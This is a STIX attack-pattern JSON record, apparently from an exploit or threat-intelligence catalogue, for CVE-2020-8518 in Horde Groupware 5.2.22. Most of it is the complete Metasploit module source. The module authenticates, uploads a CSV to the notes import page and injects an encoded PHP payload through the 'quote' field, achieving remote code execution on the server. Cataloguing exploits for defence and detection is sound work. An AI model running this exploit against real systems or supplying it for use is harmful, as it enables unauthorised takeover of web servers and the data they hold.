{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fd91291c-4ae1-4168-8312-80b6809ef13d",
    "created": "2024-08-14T17:08:12.83069Z",
    "modified": "2024-08-14T17:08:12.830695Z",
    "name": "Horde CSV import arbitrary PHP code execution",
    "description": " The Horde_Data module version 2.1.4 (and before) present in Horde Groupware version 5.2.22 allows authenticated users to inject arbitrary PHP code thus achieving RCE on the server hosting the web application.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/horde_csv_rce.rb",
            "external_id": "horde_csv_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8518"
        },
        {
            "source_name": "reference",
            "url": "https://cardaci.xyz/advisories/2020/03/10/horde-groupware-webmail-edition-5.2.22-rce-in-csv-data-import/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Horde CSV import arbitrary PHP code execution',\n        'Description' => %q{\n          The Horde_Data module version 2.1.4 (and before) present in Horde\n          Groupware version 5.2.22 allows authenticated users to inject\n          arbitrary PHP code thus achieving RCE on the server hosting the web\n          application.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Andrea Cardaci <cyrus.and@gmail.com>'],\n        'References' => [\n          ['CVE', '2020-8518'],\n          ['URL', 'https://cardaci.xyz/advisories/2020/03/10/horde-groupware-webmail-edition-5.2.22-rce-in-csv-data-import/']\n        ],\n        'DisclosureDate' => '2020-02-07',\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [['Automatic', {}]],\n        'Payload' => { 'BadChars' => \"'\" },\n        'Privileged' => false,\n        'DefaultOptions' => { 'PrependFork' => true },\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/']),\n        OptString.new('USERNAME', [true, 'The username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The password to authenticate with'])\n      ]\n    )\n  end\n\n  def login\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'login.php'),\n      'cookie' => 'Horde=x', # avoid multiple Set-Cookie\n      'vars_post' => {\n        'horde_user' => username,\n        'horde_pass' => password,\n        'login_post' => '1'\n      }\n    )\n    unless res && res.code == 302 && res.headers['Location'].include?('/services/portal/')\n      fail_with(Failure::UnexpectedReply, 'Login failed or application not found')\n    end\n\n    vprint_good(\"Logged in as #{username}:#{password}\")\n    return res.get_cookies\n  end\n\n  def upload_csv(cookie)\n    csv_fname = Rex::Text.rand_text_alpha(6..8)\n\n    data = Rex::MIME::Message.new\n    data.add_part('11', nil, nil, 'form-data; name=\"actionID\"')\n    data.add_part('1', nil, nil, 'form-data; name=\"import_step\"')\n    data.add_part('csv', nil, nil, 'form-data; name=\"import_format\"')\n    data.add_part('x', nil, nil, 'form-data; name=\"notepad_target\"')\n    data.add_part(csv_fname, nil, nil, \"form-data; name=\\\"import_file\\\"; filename=\\\"#{csv_fname}\\\"\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'mnemo/data.php'),\n      'cookie' => cookie,\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data.to_s\n    )\n\n    vprint_status(\"Uploading #{csv_fname}.csv\")\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Cannot upload the CSV file')\n    end\n\n    vprint_good('CSV file uploaded')\n  end\n\n  def execute(cookie, function_call)\n    options = {\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'mnemo/data.php'),\n      'cookie' => cookie,\n      'vars_post' => {\n        'actionID' => '3',\n        'import_step' => '2',\n        'import_format' => 'csv',\n        'header' => '1',\n        'fields' => '1',\n        'sep' => 'x',\n        'quote' => \").#{function_call}.die();}//\\\\\"\n      }\n    }\n\n    send_request_cgi(options)\n  end\n\n  def exploit\n    cookie = login\n    upload_csv(cookie)\n    # do not terminate the statement\n    function_call = payload.encoded.tr(';', '')\n    vprint_status(\"Sending payload: #{function_call}\")\n    execute(cookie, function_call)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-07",
    "x_mitre_platforms": [
        "php'"
    ]
}